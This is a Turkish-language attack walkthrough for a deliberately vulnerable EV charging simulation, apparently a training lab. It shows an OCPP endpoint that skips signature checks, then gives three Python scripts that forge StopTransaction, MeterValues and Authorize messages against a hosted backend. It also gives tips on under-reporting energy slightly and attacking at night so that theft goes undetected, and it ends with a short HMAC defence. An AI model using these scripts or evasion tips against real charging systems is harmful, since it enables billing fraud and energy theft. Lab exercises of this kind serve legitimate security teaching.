# 🕵️ Man-in-the-Middle - Mesajları Hackle! | YUSUF'UN SALDIRISI

**Senaryo ID:** `yusuf-mitm-ocpp`  
**Sorumlu:** Yusuf  
**Kategori:** Network/Protocol  
**Zayıflık:** No Signature Verification (İmza Doğrulaması Yok)  
**Şiddet:** 🔴 KRİTİK

---

## 🎯 HEDEF: OCPP Mesajlarını Değiştir!

Şarj istasyonu ile sunucu arasındaki mesajları **YAKALA** ve **DEĞİŞTİR**!

**Ne Yapabilirsin:**
- 🛑 Şarjı durdur (StopTransaction gönder)
- 💰 Enerji miktarını değiştir (MeterValues manipüle et)
- 🔓 Başkasının şarjını çal
- 📊 Sahte raporlar gönder

---

## 🔓 AÇIK NERDE?

**Dosya:** `backend/app/api/routes_vulnerable.py`  
**Satır:** 117-135

```python
# ❌ İMZA KONTROLÜ YOK!
@router.post("/ocpp-message")
def ocpp_message_handler(message: dict, signature: str = ""):
    # İmza kontrolü YAPILMIYOR!
    # Herkes istediği mesajı gönderebilir!
    
    return {
        "status": "accepted",  # Her mesaj kabul ediliyor!
        "message_processed": message
    }
```

**Sorun:** Gelen mesajın gerçekten şarj istasyonundan geldiği doğrulanmıyor!

---

## ⚔️ SALDIRI 1: Sahte StopTransaction

### Kod: `fake_stop.py`

```python
import requests
import time

BACKEND = "https://evcs-backend-samet.onrender.com"

print("🛑 SAHTE STOP TRANSACTION SALDIRISI\n")

# 1. Normal başlatma (simülasyon)
print("1️⃣ Şarj başlatılıyor...")
start_msg = {
    "message": {
        "action": "StartTransaction",
        "connectorId": 1,
        "idTag": "USER-12345",
        "meterStart": 0,
        "timestamp": time.time()
    },
    "signature": "original-signature"
}

r = requests.post(f"{BACKEND}/vulnerable/ocpp-message", json=start_msg)
print(f"   Sonuç: {r.json()['status']}\n")

# 2. SALDIRI: Sahte STOP gönder!
print("2️⃣ 🚨 SAHTE STOP TRANSACTION GÖNDERİLİYOR...")
fake_stop = {
    "message": {
        "action": "StopTransaction",
        "transactionId": "12345",
        "meterStop": 5,          # Gerçekte: 100 kWh
        "timestamp": time.time(),
        "reason": "EVDisconnected"  # Sahte sebep!
    },
    "signature": "FAKE-SIGNATURE-123"  # ← Sahte imza!
}

r = requests.post(f"{BACKEND}/vulnerable/ocpp-message", json=fake_stop)
result = r.json()

print(f"   Durum: {result['status']}")
print(f"   İşlenen Mesaj: {result['message_processed']}\n")

if result['status'] == 'accepted':
    print("✅✅✅ SALDIRI BAŞARILI! ✅✅✅")
    print("Sahte mesaj kabul edildi!")
    print("Şarj kayıtlara göre durdu ama fiziksel şarj DEVAM EDİYOR!")
    print("Kullanıcı BEDAVA enerji çekmeye devam ediyor!\n")
    print(f"Zayıflık: {result.get('vulnerability', 'N/A')}")
```

**ÇIKTI:**
```
🛑 SAHTE STOP TRANSACTION SALDIRISI

1️⃣ Şarj başlatılıyor...
   Sonuç: accepted

2️⃣ 🚨 SAHTE STOP TRANSACTION GÖNDERİLİYOR...
   Durum: accepted
   İşlenen Mesaj: {...}

✅✅✅ SALDIRI BAŞARILI! ✅✅✅
Sahte mesaj kabul edildi!
Şarj kayıtlara göre durdu ama fiziksel şarj DEVAM EDİYOR!
Kullanıcı BEDAVA enerji çekmeye devam ediyor!

Zayıflık: No signature verification!
```

---

## ⚔️ SALDIRI 2: MeterValues Manipülasyonu

```python
# meter_manipulation.py
import requests
import time

BACKEND = "https://evcs-backend-samet.onrender.com"

print("📊 METER VALUES MANİPÜLASYONU\n")

# Gerçek: 50 kWh
# Gönderilen: 10 kWh

fake_meter = {
    "message": {
        "action": "MeterValues",
        "connectorId": 1,
        "transactionId": "12345",
        "meterValue": [
            {
                "timestamp": time.time(),
                "sampledValue": [
                    {
                        "value": "10000",  # 10 kWh (Gerçek: 50 kWh)
                        "unit": "Wh",
                        "measurand": "Energy.Active.Import.Register"
                    }
                ]
            }
        ]
    },
    "signature": "fake-manipulated-signature"
}

r = requests.post(f"{BACKEND}/vulnerable/ocpp-message", json=fake_meter)
result = r.json()

if result['status'] == 'accepted':
    print("✅ Sahte meter değeri kabul edildi!")
    print("📉 Gerçek tüketim: 50 kWh")
    print("📊 Sisteme gönderilen: 10 kWh")
    print("💰 ~200 TL tasarruf!")
```

---

## ⚔️ SALDIRI 3: Toplu Mesaj Değiştirme

```python
# mass_mitm.py
import requests
import time

BACKEND = "https://evcs-backend-samet.onrender.com"

# Farklı mesaj tipleri
fake_messages = [
    {
        "name": "Authorize (Sahte RFID)",
        "data": {
            "message": {"action": "Authorize", "idTag": "HACKED-RFID-999"},
            "signature": "fake"
        }
    },
    {
        "name": "StatusNotification (Sahte Arıza)",
        "data": {
            "message": {
                "action": "StatusNotification",
                "status": "Faulted",
                "errorCode": "GroundFailure"
            },
            "signature": "fake"
        }
    },
    {
        "name": "Heartbeat (Sahte Durum)",
        "data": {
            "message": {"action": "Heartbeat"},
            "signature": "fake"
        }
    }
]

print("🔁 TOPLU MESAJ MANİPÜLASYONU\n")

success = 0
for msg in fake_messages:
    r = requests.post(f"{BACKEND}/vulnerable/ocpp-message", json=msg['data'])
    
    if r.json()['status'] == 'accepted':
        print(f"✅ {msg['name']}: KABUL EDİLDİ")
        success += 1
    else:
        print(f"❌ {msg['name']}: Reddedildi")

print(f"\n📊 Sonuç: {success}/{len(fake_messages)} mesaj hacklendi!")

if success == len(fake_messages):
    print("🎉 TÜM MESAJLAR MANİPÜLE EDİLDİ!")
```

---

## ✅ SIZDIN MI? KONTROL!

### 1. Terminal Çıktısı

**BAŞARILI:**
```
✅✅✅ SALDIRI BAŞARILI! ✅✅✅
Sahte mesaj kabul edildi!
```

**BAŞARISIZ:**
```
❌ Hata: Invalid signature
❌ Message rejected
```

### 2. JSON Response

**SIZMA BAŞARILI:**
```json
{
  "status": "accepted",           ← "accepted" ise SIZDIN!
  "message_processed": {...},     ← Senin mesajın işlendi!
  "vulnerability": "No signature verification!",
  "warning": "Anyone can send/modify messages"
}
```

### 3. Web Arayüzü

https://simulasyon.vercel.app/ → `yusuf-mitm-ocpp`

**Logs:**
```
[WARN] Invalid Certs                    ← UYARI!
[WARN] Replayed Messages                ← TEKRAR!
[ERROR] Hash Mismatch                   ← İMZA HATASI!
[CRITICAL] MITM attack detected         ← TESPİT!
```

---

## 🎯 BAŞARI KRİTERLERİ

| Kontrol | Başarı | Sen |
|---------|--------|-----|
| status = "accepted" | ✅ | ___  |
| Sahte signature kabul edildi | ✅ | ___ |
| Logs'ta WARNING | ✅ | ___ |
| message_processed dolu | ✅ | ___ |
| vulnerability field var | ✅ | ___ |

**3/5 ✅ ise MITM BAŞARILI!**

---

## 💡 PRO İPUÇLARI

### En Etkili Mesaj:
```python
# StopTransaction = En çok hasar
# Şarj dururken kullanıcı çekmeye devam eder
{
    "action": "StopTransaction",
    "meterStop": 1,  # Çok düşük
    "reason": "EVDisconnected"
}
```

### Tespit Edilmemek:
```python
# Gerçekçi değerler kullan
meterStop = 45  # Gerçek: 50 (5 kWh çal)
# Çok düşük değil, tespit zor
```

### Zamanlama:
```python
# Gece yaparsan fark edilmez
import datetime
if datetime.datetime.now().hour >= 23:
    # Saldır!
```

---

## 🛡️ SAVUNMA

### Gerçek Sistemler Nasıl Korunur:

```python
import hmac
import hashlib

def verify_signature(message, signature, secret_key):
    expected = hmac.new(
        secret_key.encode(),
        json.dumps(message).encode(),
        hashlib.sha256
    ).hexdigest()
    
    if not hmac.compare_digest(expected, signature):
        raise Exception("Invalid signature!")
```

### TLS/SSL:
```python
# HTTPS ile şifreli iletişim
# Certificate pinning
```

---

## ⚠️ UYARI

- ✅ Sadece burda test et
- ❌ Gerçek OCPP sistemlerine SALDIRMA
- 🚓 MITM saldırısı federal SUÇtur!

---

**Hazırlayan:** Yusuf  
**Tarih:** 2024-12-23  
**Durum:** ✅ HACK THE PROTOCOL!
